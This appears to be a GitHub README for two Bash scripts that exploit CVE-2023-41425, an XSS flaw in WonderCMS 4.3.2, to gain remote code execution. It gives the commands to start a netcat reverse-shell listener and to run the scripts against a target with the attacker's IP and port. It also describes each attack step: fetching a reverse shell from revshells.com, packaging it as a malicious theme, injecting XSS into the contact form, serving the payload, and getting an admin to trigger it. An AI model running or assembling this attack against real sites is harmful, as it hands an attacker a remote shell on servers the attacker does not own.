<a href="https://www.buymeacoffee.com/0xDTC"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a knowledge&emoji=📖&slug=0xDTC&button_colour=FF5F5F&font_colour=ffffff&font_family=Comic&outline_colour=000000&coffee_colour=FFDD00" /></a>

# WonderCMS 4.3.2 XSS to RCE Exploits

## Overview

These scripts exploit an XSS (Cross-Site Scripting) vulnerability in **WonderCMS 4.3.2** to achieve **Remote Code Execution (RCE)**. The XSS payload, when triggered by the admin, automatically installs a reverse shell on the target server by leveraging a crafted malicious theme module. The reverse shell is obtained from **revshells.com** and executed, granting the attacker remote access to the server.

---

## Table of Contents

- [Prerequisites](#prerequisites)
- [Script 1: Automatic Exploit](#script-1-automatic-exploit)
  - [Features](#features)
  - [Usage](#usage)
- [Script 2: Manual Exploit](#script-2-manual-exploit)
  - [Features](#features-1)
  - [Usage](#usage-1)
- [Notes](#notes)
- [License](#license)

---

## Prerequisites

To successfully run either script, the following tools and conditions are required:

1. **Bash Shell**: Both scripts are written for Linux environments using the Bash shell.
2. **netcat (nc)**: Used to listen for the reverse shell connection.
3. **Python3**: A simple Python HTTP server is used to host the XSS payload.
4. **WonderCMS 4.3.2**: The target must be running a vulnerable version of WonderCMS.
5. **Administrator Interaction**: The payload requires an admin to trigger the XSS, which results in the reverse shell execution.
6. **revshells.com**: The reverse shell payload is downloaded dynamically from revshells.com.

---

## Script 1: Automatic Exploit

### POC

![Pasted image 20241010021603](https://github.com/user-attachments/assets/574eec93-47ee-43b6-88f7-ac232c0b341b)

### Features

This version of the exploit automatically checks for an active `nc` listener, downloads the reverse shell, starts the HTTP server, sends the payload, and waits for the admin to trigger the reverse shell.

- **Automatic Reverse Shell Setup**: Downloads a pre-generated reverse shell from revshells.com.
- **XSS Payload Injection**: Injects an XSS payload in the target's contact form.
- **HTTP Server Management**: Automatically starts a Python HTTP server to host the reverse shell payload.
- **nc Listener Check**: Ensures the listener is running before proceeding.
- **Payload Auto-send**: Sends the payload automatically without user interaction.

### Usage

1. Ensure the `nc` listener is running on the specified port:
   ```bash
   nc -nvlp <PORT>
   ```
2. Run the script with the following command:
   ```bash
   ./AUTO_CVE-2023-41425 <loginURL> <attacker_IP> <attacker_PORT>
   ```
   Example:
   ```bash
   ./AUTO_CVE-2023-41425 http://localhost/loginURL 192.168.29.165 5252
   ```

### Workflow

1. **Download Reverse Shell**: The script downloads the reverse shell from `revshells.com`.
2. **Modify the Reverse Shell**: The reverse shell script is updated with the attacker's IP and port.
3. **Create ZIP Payload**: A ZIP file containing the reverse shell is created.
4. **Craft XSS Payload**: An XSS payload that installs the reverse shell is generated and injected into the vulnerable contact form.
5. **Auto-Start HTTP Server**: The script starts a Python HTTP server to serve the malicious payload.
6. **Auto-Send Payload**: The XSS payload is sent to the admin automatically.

---

## Script 2: Manual Exploit

### POC

![Pasted image 20241010013048](https://github.com/user-attachments/assets/2ace908d-e74f-43a0-8b25-7677953b731f)

Use the exploit provided by the script in Website field...

![Pasted image 20241010013218](https://github.com/user-attachments/assets/aad7312e-4c6b-4238-987e-888424fb7a2a)


### Features

This version requires the user to manually manage the `nc` listener and the XSS payload triggering. It is more suited for scenarios where automatic processes are not desirable.

- **Manual Reverse Shell Setup**: The user is responsible for ensuring the listener is running.
- **Manual XSS Triggering**: The script provides the malicious link to be sent to the admin, but the payload must be triggered manually.
- **HTTP Server Management**: Starts a Python HTTP server to host the XSS payload.

### Usage

1. Ensure the `nc` listener is running on the specified port:
   ```bash
   nc -nvlp <PORT>
   ```
2. Run the script with the following command:
   ```bash
   ./CVE-2023-41425 <loginURL> <attacker_IP> <attacker_PORT>
   ```
   Example:
   ```bash
   ./CVE-2023-41425 http://localhost/loginURL 192.168.29.165 5252
   ```

### Workflow

1. **Download Reverse Shell**: Downloads a reverse shell from `revshells.com`.
2. **Modify the Reverse Shell**: Updates the reverse shell with the attacker's IP and port.
3. **Create ZIP Payload**: Creates a ZIP file containing the reverse shell.
4. **Craft XSS Payload**: Generates an XSS payload that installs the reverse shell.
5. **Display Malicious Link**: Displays the link that needs to be sent to the admin for triggering.
6. **Start HTTP Server**: Starts a Python HTTP server to host the payload.

---

## Notes

- **Admin Interaction**: Both exploits rely on the WonderCMS admin triggering the XSS payload by visiting the vulnerable page. Once triggered, the reverse shell is established with the attacker's machine.
- **Firewall/IDS/IPS**: Be cautious when running these exploits on environments protected by firewalls or Intrusion Detection Systems (IDS) that might block or alert on suspicious activity.
- **Responsible Disclosure**: If you find that a target is vulnerable, always follow ethical guidelines and report the vulnerability to the appropriate parties.
